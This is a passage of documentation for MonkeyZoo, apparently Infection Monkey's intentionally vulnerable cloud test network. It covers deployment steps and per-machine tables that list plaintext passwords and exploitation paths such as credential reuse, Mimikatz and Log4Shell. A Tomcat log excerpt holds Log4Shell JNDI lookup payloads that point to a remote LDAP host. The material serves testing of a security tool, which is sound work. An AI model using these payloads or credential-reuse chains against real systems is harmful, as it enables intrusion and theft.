This document describes Infection Monkey’s test network, how to deploy and use it.

[Warning\!](#warning)<br>
[Introduction](#introduction)<br>
[Getting started](#getting-started)<br>
[Using islands](#using-islands)<br>
[Running tests](#running-tests)<br>
[Machines’ legend](#machines-legend)<br>
[Machines](#machines)<br>
[Nr. 2 Hadoop](#_Toc526517182)<br>
[Nr. 3 Hadoop](#_Toc526517183)<br>
[Nr. 9 Tunneling M1](#_Toc536021462)<br>
[Nr. 10 Tunneling M2](#_Toc536021463)<br>
[Nr. 11 Tunneling M1](#_Toc536021464)<br>
[Nr. 12 Tunneling M2](#_Toc536021465)<br>
[Nr. 13 Tunneling M2](#_Toc536021466)<br>
[Nr. 11 SSH key steal](#_Toc526517190)<br>
[Nr. 12 SSH key steal](#_Toc526517191)<br>
[Nr. 13 RDP grinder](#_Toc526517192)<br>
[Nr. 14 Mimikatz](#_Toc536021467)<br>
[Nr. 15 Mimikatz](#_Toc536021468)<br>
[Nr. 16 MsSQL](#_Toc536021469)<br>
[Nr. 17 Upgrader](#_Toc536021470)<br>
[Nr. 21 Scan](#_Toc526517196)<br>
[Nr. 22 Scan](#_Toc526517197)<br>
[Nr. 25 Zerologon](#_Toc536021478)<br>
[Nr. 3-45 Powershell](#_Toc536021479)<br>
[Nr. 3-46 Powershell](#_Toc536021480)<br>
[Nr. 3-47 Powershell](#_Toc536021481)<br>
[Nr. 3-48 Powershell](#_Toc536021482)<br>
[Nr. 14 Credentials Reuse](#_Toc536121480)<br>
[Nr. 15 Credentials Reuse](#_Toc536121481)<br>
[Nr. 16 Credentials Reuse](#_Toc536121482)<br>
[Nr. 3-49 Log4j Solr](#_Toc536021483)<br>
[Nr. 3-50 Log4j Solr](#_Toc536021484)<br>
[Nr. 3-51 Log4j Tomcat](#_Toc536021485)<br>
[Nr. 3-52 Log4j Tomcat](#_Toc536021486)<br>
[Nr. 3-55 Log4j Logstash](#_Toc536021487)<br>
[Nr. 3-56 Log4j Logstash](#_Toc536021488)<br>
[Nr. 250 MonkeyIsland](#_Toc536021489)<br>
[Nr. 251 MonkeyIsland](#_Toc536021490)<br>
[Network topography](#network-topography)<br>

# Warning\!

This project builds an intentionally
<span class="underline">vulnerable</span> network. Make sure not to add
production servers to the same network and leave it closed to the
public.

# Introduction:

MonkeyZoo is a Google Cloud Platform network deployed with terraform.
Terraform scripts allows you to quickly setup a network that’s full of
vulnerable machines to regression test monkey’s exploiters, evaluate
scanning times in a real-world scenario and many more.

# Getting started:

Requirements:
1.  Have terraform installed.
2.  Have a Google Cloud Platform account (upgraded if you want to test
    whole network at once).

To deploy:
1.  Configure service account for your project:

    a. Create a service account (GCP website -> IAM & Admin -> Service Accounts -> + CREATE SERVICE ACCOUNT) and name it “your\_name-monkeyZoo-user”

    b. Give these permissions to your service account:

    **Compute Engine -> Compute Network Admin**
    and
    **Compute Engine -> Compute Instance Admin (v1)**
    and
    **Compute Engine -> Compute Security Admin**
    and
    **Service Account User**

    or

    **Project -> Owner**

    c. Create and download its **Service account key** in JSON and place it in **monkey_zoo/gcp_keys** as **gcp_key.json**.

2.  Get these permissions in the monkeyZoo project (guardicore-22050661) for your service account (ask monkey developers to add them):

    a.  **Compute Engine -\> Compute image user**

3.  Change configurations located in the
    ../monkey/envs/monkey\_zoo/terraform/config.tf file (don’t forget to
    link to your service account key file):

         provider "google" {

         project = "test-000000" // Change to your project id

           region  = "europe-west3" // Change to your desired region or leave default

           zone    = "europe-west3-b" // Change to your desired zone or leave default

           credentials = "${file("../gcp_keys/gcp_key.json")}" // Change to the location and name of the service key.
                                                               // If you followed instruction above leave it as is

         }

         locals {

           resource_prefix = "" // All of the resources will have this prefix.
                                // Only change if you want to have multiple zoo's in the same project

           service_account_email="tester-monkeyZoo-user@testproject-000000.iam.gserviceaccount.com" // Service account email

           monkeyzoo_project="guardicore-22050661" // Project where monkeyzoo images are kept. Leave as is.

         }

4.  Run terraform init

To deploy the network run:<br>
`terraform plan` (review the changes it will make on GCP)<br>
`terraform apply` (creates 2 networks for machines)<br>
`terraform apply` (adds machines to these networks)

# Using islands:

### How to get into the islands:

**island-linux-250:** SSH from GCP

**island-windows-251:** In GCP/VM instances page click on
island-windows-251. Set password for your account and then RDP into
the island.

### These are most common steps on monkey islands:

### For users

Upload the AppImage deployment option and run it in island-linux-250.
Or upload the MSI deployment option, install it and run it in island-windows-251.
After that use the Monkey as you would on local network.

### For developers

#### island-linux-250:

To run monkey island from source:<br>
`sudo /usr/run\_island.sh`<br>

To run monkey from source:<br>
`sudo /usr/run\_monkey.sh`<br>

To update repository:<br>
`git pull /usr/infection_monkey`<br>

Update all requirements using deployment script:<br>
1\. `cd /usr/infection_monkey/deployment_scripts`<br>
2\. `./deploy_linux.sh "/usr/infection_monkey" "develop"`<br>

#### island-windows-251:

To run monkey island from source:<br>
Execute C:\\run\_monkey\_island.bat as administrator

To run monkey from source:<br>
Execute C:\\run\_monkey.bat as administrator

To update repository:<br>
1\. Open cmd as an administrator<br>
2\. `cd C:\infection_monkey`<br>
3\. `git pull` (updates develop branch)<br>

Update all requirements using deployment script:<br>
1\. `cd C:\infection_monkey\deployment_scripts`<br>
2\. `./run_script.bat "C:\infection_monkey" "develop"`<br>

# Machines:

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc526517182" class="anchor"></span>Nr. <strong>2</strong> Hadoop</p>
<p>(10.2.2.2)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 16.04.05 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td><p>JDK,</p>
<p><a href="https://hadoop.apache.org/releases.html">Hadoop 2.9.1</a></p></td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>8020</td>
</tr>
<tr class="even">
<td>Server’s config:</td>
<td><a href="https://hadoop.apache.org/docs/stable/hadoop-project-dist/hadoop-common/SingleCluster.html">Single node cluster</a></td>
</tr>
<tr class="odd">
<td>Scan results:</td>
<td>Machine exploited using Hadoop exploiter</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td></td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc526517183" class="anchor"></span>Nr. <strong>3</strong> Hadoop</p>
<p>(10.2.2.3)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows 10 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td><p>JDK,</p>
<p><a href="https://hadoop.apache.org/releases.html">Hadoop 2.9.1</a></p></td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>8020</td>
</tr>
<tr class="even">
<td>Server’s config:</td>
<td><a href="https://hadoop.apache.org/docs/stable/hadoop-project-dist/hadoop-common/SingleCluster.html">Single node cluster</a></td>
</tr>
<tr class="odd">
<td>Scan results:</td>
<td>Machine exploited using Hadoop exploiter</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td></td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021462" class="anchor"></span>Nr. <strong>9</strong> Tunneling M1</p>
<p>(10.2.2.9, 10.2.1.9)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 16.04.05 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>OpenSSL</td>
</tr>
<tr class="odd">
<td>Default service’s port:</td>
<td>22</td>
</tr>
<tr class="even">
<td>Root password:</td>
<td>`))jU7L(w}</td>
</tr>
<tr class="odd">
<td>Server’s config:</td>
<td>Default</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td></td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021463" class="anchor"></span>Nr. <strong>10</strong> Tunneling M2</p>
<p>(10.2.1.10)</p></th>
<th>(Exploitable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 16.04.05 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>OpenSSL</td>
</tr>
<tr class="odd">
<td>Default service’s port:</td>
<td>22</td>
</tr>
<tr class="even">
<td>Root password:</td>
<td>3Q=(Ge(+&w]*</td>
</tr>
<tr class="odd">
<td>Server’s config:</td>
<td>Default</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>Accessible only through Nr.9</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021464" class="anchor"></span>Nr. <strong>11</strong> Tunneling M3</p>
<p>(10.2.0.11)</p></th>
<th>(Exploitable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 16.04.05 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>OpenSSL</td>
</tr>
<tr class="odd">
<td>Default service’s port:</td>
<td>22</td>
</tr>
<tr class="even">
<td>Root password:</td>
<td>3Q=(Ge(+&w]*</td>
</tr>
<tr class="odd">
<td>Server’s config:</td>
<td>Contains firewall rules to block everything from 10.2.1.10 except ssh.
This prevents tunneling communication, but allows ssh exploitation.
Contains firewall rules to allow everything from 10.2.1.9 except ssh.
This prevents ssh exploitation, but allows tunneling.</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>Accessible only through Nr.10</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021465" class="anchor"></span>Nr. <strong>12</strong> Tunneling M4</p>
<p>(10.2.0.12)</p></th>
<th>(Exploitable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows server 2019 x64</strong></td>
</tr>
<tr class="odd">
<td>Default service’s port:</td>
<td>445</td>
</tr>
<tr class="even">
<td>Root password:</td>
<td>t67TC5ZDmz</td>
</tr>
<tr class="odd">
<td>Server’s config:</td>
<td>Default</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>Accessible only through Nr.10</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021466" class="anchor"></span>Nr. <strong>13</strong> Tunneling M5</p>
<p>(10.2.0.13)</p></th>
<th>(Exploitable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 18 x64</strong></td>
</tr>
<tr class="odd">
<td>Default service’s port:</td>
<td>22</td>
</tr>
<tr class="even">
<td>Root password:</td>
<td>prM2qsroTI</td>
</tr>
<tr class="odd">
<td>Server’s config:</td>
<td>Configured to disable traffic from/to 10.2.0.10 and 10.2.0.11(via ufw and iptables)</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>Accessible only through Nr.12</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc526517190" class="anchor"></span>Nr. <strong>11</strong> SSH key steal.</p>
<p>(10.2.2.11)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 16.04.05 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>OpenSSL</td>
</tr>
<tr class="odd">
<td>Default connection port:</td>
<td>22</td>
</tr>
<tr class="even">
<td>Root password:</td>
<td>^NgDvY59~8</td>
</tr>
<tr class="odd">
<td>Server’s config:</td>
<td>SSH keys to connect to NR. 11</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td></td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc526517191" class="anchor"></span>Nr. <strong>12</strong> SSH key steal.</p>
<p>(10.2.2.12)</p></th>
<th>(Exploitable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 16.04.05 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>OpenSSL</td>
</tr>
<tr class="odd">
<td>Default connection port:</td>
<td>22</td>
</tr>
<tr class="even">
<td>Root password:</td>
<td>u?Sj5@6(-C</td>
</tr>
<tr class="odd">
<td>Server’s config:</td>
<td>SSH configured to allow connection from NR.10</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>Don’t add this machine’s credentials to exploit configuration.</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc526517192" class="anchor"></span>Nr. <strong>13</strong> RDP grinder</p>
<p>(10.2.2.13)</p></th>
<th>(Not implemented)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows 10 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>-</td>
</tr>
<tr class="odd">
<td>Default connection port:</td>
<td>3389</td>
</tr>
<tr class="even">
<td>Root password:</td>
<td>2}p}aR]&amp;=M</td>
</tr>
<tr class="odd">
<td>Server’s config:</td>
<td><p>Remote desktop enabled</p>
<p>Admin user’s credentials:</p>
<p>m0nk3y, 2}p}aR]&amp;=M</p></td>
</tr>
<tr class="even">
<td>Notes:</td>
<td></td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021467" class="anchor"></span>Nr. <strong>14</strong> Mimikatz</p>
<p>(10.2.2.14)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows 10 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>-</td>
</tr>
<tr class="odd">
<td>Admin password:</td>
<td>Ivrrw5zEzs</td>
</tr>
<tr class="even">
<td>Server’s config:</td>
<td><p>Has cached mimikatz-15 RDP credentials</p>
<p><a href="https://social.technet.microsoft.com/Forums/windows/en-US/8160d62b-0f5d-48a3-9fe9-5cd319837917/how-te-reenable-smb1-in-windows1o?forum=win10itprogeneral">SMB</a> turned on</p></td>
</tr>
<tr class="odd">
<td>Notes:</td>
<td></td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021468" class="anchor"></span>Nr. <strong>15</strong> Mimikatz</p>
<p>(10.2.2.15)</p></th>
<th>(Exploitable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows 10 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>-</td>
</tr>
<tr class="odd">
<td>Admin password:</td>
<td>pAJfG56JX&gt;&lt;</td>
</tr>
<tr class="even">
<td>Server’s config:</td>
<td><p>It’s credentials are cashed at mimikatz-14</p>
<p><a href="https://social.technet.microsoft.com/Forums/windows/en-US/8160d62b-0f5d-48a3-9fe9-5cd319837917/how-te-reenable-smb1-in-windows1o?forum=win10itprogeneral">SMB</a> turned on</p></td>
</tr>
<tr class="odd">
<td>Notes:</td>
<td>If you change this machine’s IP it won’t get exploited.</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021469" class="anchor"></span>Nr. <strong>16</strong> MsSQL</p>
<p>(10.2.2.16)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows 10 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>MSSQL Server</td>
</tr>
<tr class="odd">
<td>Default service port:</td>
<td>1433</td>
</tr>
<tr class="even">
<td>Server’s config:</td>
<td><p>xp_cmdshell feature enabled in MSSQL server</p></td>
</tr>
<tr class="odd">
<td>SQL server auth. creds:</td>
<td><p>m0nk3y : Xk8VDTsC</p></td>
</tr>
<tr class="even">
<td>Notes:</td>
<td><p>Enabled SQL server browser service</p>
<p><a href="https://docs.microsoft.com/en-us/sql/relational-databases/lesson-2-connecting-from-another-computer?view=sql-server-2017">Enabled remote connections</a></p>
<p><a href="https://support.plesk.com/hc/en-us/articles/213397429-How-to-change-a-password-for-the-sa-user-in-MS-SQL-">Changed default password</a></p></td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021470" class="anchor"></span>Nr. <strong>17</strong> Upgrader</p>
<p>(10.2.2.17)</p></th>
<th>(Not implemented)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows 10 x64</strong></td>
</tr>
<tr class="even">
<td>Default service port:</td>
<td>445</td>
</tr>
<tr class="odd">
<td>Root password:</td>
<td>U??7ppG_</td>
</tr>
<tr class="even">
<td>Server’s config:</td>
<td><a href="https://social.technet.microsoft.com/Forums/windows/en-US/8160d62b-0f5d-48a3-9fe9-5cd319837917/how-te-reenable-smb1-in-windows1o?forum=win10itprogeneral">Turn on SMB</a></td>
</tr>
<tr class="odd">
<td>Notes:</td>
<td></td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc526517196" class="anchor"></span>Nr. <strong>21</strong> Scan</p>
<p>(10.2.2.21)</p></th>
<th>(Secure)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 16.04.05 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>Apache tomcat 7.0.92</td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>8080</td>
</tr>
<tr class="even">
<td>Server’s config:</td>
<td>Default</td>
</tr>
<tr class="odd">
<td>Notes:</td>
<td>Used to scan a machine that has no vulnerabilities (to evaluate scanning speed for e.g.)</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc526517197" class="anchor"></span>Nr. <strong>22</strong> Scan</p>
<p>(10.2.2.22)</p></th>
<th>(Secure)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows 10 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>Apache tomcat 7.0.92</td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>8080</td>
</tr>
<tr class="even">
<td>Server’s config:</td>
<td>Default</td>
</tr>
<tr class="odd">
<td>Notes:</td>
<td>Used to scan a machine that has no vulnerabilities (to evaluate scanning speed for e.g.)</td>
</tr>
<tr class="even">
<td></td>
<td></td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021478" class="anchor"></span>Nr. <strong>25</strong> ZeroLogon </p>
<p>(10.2.2.25)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Server 2016</strong></td>
</tr>
<tr class="even">
<td>Default server’s port:</td>
<td>135</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021479" class="anchor"></span>Nr. <strong>3-44 Powershell</strong></p>
<p>(10.2.3.44)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows Server 2016 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>WinRM service</td>
</tr>
<tr class="odd">
<td>Default server’s port: 5985, 5986</td>
<td>-</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>User: m0nk3y, Password: nPj8rbc3<br>
Accessible using the same m0nk3y user from powershell-3-46,
in other words powershell exploiter can exploit
this machine without credentials as long as the user running the agent has
the same credentials on both machines</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021479" class="anchor"></span>Nr. <strong>3-45 Powershell</strong></p>
<p>(10.2.3.45)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows Server 2016 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>WinRM service</td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>-</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>User: m0nk3y, Password: Passw0rd!<br>User: m0nk3y-user, No Password.<br>
Accessibale through Island using m0nk3y-user.</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021480" class="anchor"></span>Nr. <strong>3-46 Powershell</strong></p>
<p>(10.2.3.46)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows Server 2016 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>WinRM service</td>
<td>Tomcat 8.0.36</td>
</tr>
<tr class="odd">
<td>Default server’s port:8080</td>
<td>-</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>User: m0nk3y, Password: nPj8rbc3<br>
Exploited from island via log4shell(tomcat). Then uses cached powershell credentials to
propagate to powershell-3-44</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021481" class="anchor"></span>Nr. <strong>3-47 Powershell</strong></p>
<p>(10.2.3.47)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows Server 2016 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>WinRM service</td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>-</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>User: m0nk3y, Password: Xk8VDTsC<br>
Accessiable through the Island using NTLM hash</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021482" class="anchor"></span>Nr. <strong>3-48 Powershell</strong></p>
<p>(10.2.3.48)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows Server 2019 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>WinRM service</td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>-</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>User: m0nk3y, Password: Passw0rd!<br>
Accessiable only through <strong>3-45 Powershell</strong> using credentials reuse</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536121480" class="anchor"></span>Nr. <strong>14</strong> Credentials Reuse</p>
<p>(10.2.3.14, 10.2.4.14)</p></th>
<th>(Exploitable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 16.04.05 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>OpenSSL</td>
</tr>
<tr class="odd">
<td>Default service’s port:</td>
<td>22</td>
</tr>
<tr class="even">
<td>Credentials:</td>
<td>m0nk3y:u26gbVQe</td>
</tr>
<tr class="odd">
<td>Server’s config:</td>
<td>VPC network that can only access Credentials Reuse 15 and Island.</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>Accessible from the Island with password authentication</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536121481" class="anchor"></span>Nr. <strong>15</strong> Credentials Reuse</p>
<p>(10.2.4.15, 10.2.5.15)</p></th>
<th>(Exploitable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 16.04.05 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>OpenSSL</td>
</tr>
<tr class="odd">
<td>Default service’s port:</td>
<td>22</td>
</tr>
<tr class="even">
<td>Credentials:</td>
<td>m0nk3y:5BuYHeVl</td>
</tr>
<tr class="odd">
<td>Server’s config:</td>
<td>VPC network that can be only accessed by Credentials Reuse 14 and communicate to<br>
Credentials Reuse 16.
</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>Accessible from the Credentials Reuse 14 with password authentication</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536121482" class="anchor"></span>Nr. <strong>16</strong> Credentials Reuse</p>
<p>(10.2.3.16, 10.2.5.16)</p></th>
<th>(Exploitable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 16.04.05 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>OpenSSL</td>
</tr>
<tr class="odd">
<td>Default service’s port:</td>
<td>22</td>
</tr>
<tr class="even">
<td>Credentials:</td>
<td>m0nk3y:lIZl6vTR</td>
</tr>
<tr class="odd">
<td>Server’s config:</td>
<td>VPC network that can be only accessed by Credentials Reuse 15 and communicate to<br>
the Island.
</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>Accessible from the Credentials Reuse 15 with passwordless ssh key authentication.<br>
We use the ssh key that was stolen from Credentials Reuse 16</td>
</tr>
</tbody>
</table>


<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021483" class="anchor"></span>Nr. <strong>3-49 Log4j Solr</strong></p>
<p>(10.2.3.49)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 18.04LTS</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>Apache Solr 8.11.0</td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>8983</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>User: m0nk3y, Password: m0nk3y</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021484" class="anchor"></span>Nr. <strong>3-50 Log4j Solr</strong></p>
<p>(10.2.3.50)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows Server 2016 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>Apache solr 8.11.0</td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>8983</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>User: m0nk3y, Password: Passw0rd!</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021485" class="anchor"></span>Nr. <strong>3-51 Log4j Tomcat</strong></p>
<p>(10.2.3.51)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 18.04LTS</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>Apache Tomcat 8.0.36</td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>8080</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>The jvm's `java.security.egd` variable should be set to `/dev/urandom`,
otherwise the tomcat service can take a very long time to start. Set this by
editing `/usr/tomcat/bin/catalina.sh` and modifying the `JAVA_OPTS` vairable.
See https://jfrog.com/knowledge-base/tomcat-takes-forever-to-start-what-can-i-do/
for more details.

Tomcat sessions that carry over through a reset can cause significant delays
when the tomcat server starts. When the server starts, it attempts to download
the log4shell payload, but the server is no longer listening. This operation
appears to have a 2 minute timeout. You can see it by viewing
`/usr/tomcat/logs/localhost.log`:

```
2022-04-28 16:15:45,541 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]- Sending application start events
2022-04-28 16:15:45,542 [localhost-startStop-1] INFO  org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]- ContextListener: contextInitialized()
2022-04-28 16:15:45,542 [localhost-startStop-1] INFO  org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]- SessionListener: contextInitialized()
2022-04-28 16:15:45,665 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]- readObject() loading session E5B004FF35E1CBB44FA8A69AB024941D
2022-04-28 16:15:45,665 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]-   loading attribute 'foo' with value '${jndi:ldap://10.2.2.121:29573/dn=Exploit}'
2022-04-28 16:17:56,412 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]- readObject() loading session 0677AD75F804B1FD4E24AF7F3BFA9DD9
2022-04-28 16:17:56,412 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]-   loading attribute 'foo' with value '${jndi:ldap://10.2.2.121:39466/dn=Exploit}'
2022-04-28 16:20:07,472 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]- Starting filters
2022-04-28 16:20:07,472 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]-  Starting filter 'Set Character Encoding'
2022-04-28 16:20:07,477 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]-  Starting filter 'Compression Filter'
```

Notice the 2-minute gap between the timestamps after "loading attribute 'foo'".

To resolve this, modify /usr/tomcat/conf/context.xml and uncomment the following
setting:

```
<Manager pathname="" />
```
</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021486" class="anchor"></span>Nr. <strong>3-52 Log4j Tomcat</strong></p>
<p>(10.2.3.52)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Windows Server 2016 x64</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>Apache Tomcat 8.0.36</td>
</tr>
<tr class="odd">
<td>Default server’s port:</td>
<td>8080</td>
</tr>
<tr class="even">
<td>Notes:</td>
<td>User: m0nk3y, Password: Tomcat@22</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr class="header">
<th><p><span id="_Toc536021487" class="anchor"></span>Nr. <strong>3-55 Log4j Logstash</strong></p>
<p>(10.2.3.55)</p></th>
<th>(Vulnerable)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>OS:</td>
<td><strong>Ubuntu 18.04LTS</strong></td>
</tr>
<tr class="even">
<td>Software:</td>
<td>Logstash 5.5.0</td>
